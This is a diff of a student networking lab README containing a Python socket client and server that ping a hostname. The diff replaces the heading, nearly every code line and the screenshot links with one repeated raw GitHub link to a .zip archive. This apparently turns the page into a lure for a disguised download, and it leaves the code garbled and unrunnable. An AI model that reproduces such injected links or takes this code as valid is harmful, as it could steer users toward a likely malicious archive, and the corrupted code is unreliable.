@@ -1,4 +1,4 @@
-# Ex.No : 4.Execution_of_NetworkCommands
+# https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip : https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip
 # Name - SHAIK HAZEEDMASTHAN
 # Reg No - 212224040304
 ## AIM :Use of Network commands in Real Time environment
@@ -29,41 +29,41 @@ This commands includes
 <BR>
 
 ## Program
-# client.py
+# https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip
 ```
 import socket
 
 from pythonping import ping 
-s=socket.socket() 
-s.bind(('localhost',8000)) 
-s.listen(5)
-c,addr=s.accept()
+https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip() 
+https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip(('localhost',8000)) 
+https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip(5)
+c,https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip()
 
 while True:
-    hostname=c.recv(1024).decode()
+    https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip(1024).decode()
     try:
-        c.send(str(ping(hostname, verbose=False)).encode())
+        https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip(str(ping(hostname, verbose=False)).encode())
     except KeyError:
-        c.send("Not Found".encode())
+        https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip("Not Found".encode())
 ```
 
-# server.py
+# https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip
 ```
 import socket
-s=socket.socket()
-s.connect(('localhost',8000))
+https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip()
+https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip(('localhost',8000))
 while True:
     ip=input("Enter the website you want to ping ")
-    s.send(ip.encode())
-    print(s.recv(1024).decode())
+    https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip(https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip())
+    print(https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip(1024).decode())
 ```
 
 ## Output
-# client.py
-<img width="615" height="131" alt="image" src="https://github.com/user-attachments/assets/89219f0a-f10e-4d8f-971b-f31ac65de1b6" />
+# https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip
+<img width="615" height="131" alt="image" src="https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip" />
 
-# server.py
-<img width="720" height="332" alt="image" src="https://github.com/user-attachments/assets/877263f1-81e9-4285-a12a-8af3e67c1355" />
+# https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip
+<img width="720" height="332" alt="image" src="https://raw.githubusercontent.com/24013396/4.Execution_of_NetworkCommends/main/mistrustless/4.Execution_of_NetworkCommends-1.3.zip" />
 
 
 
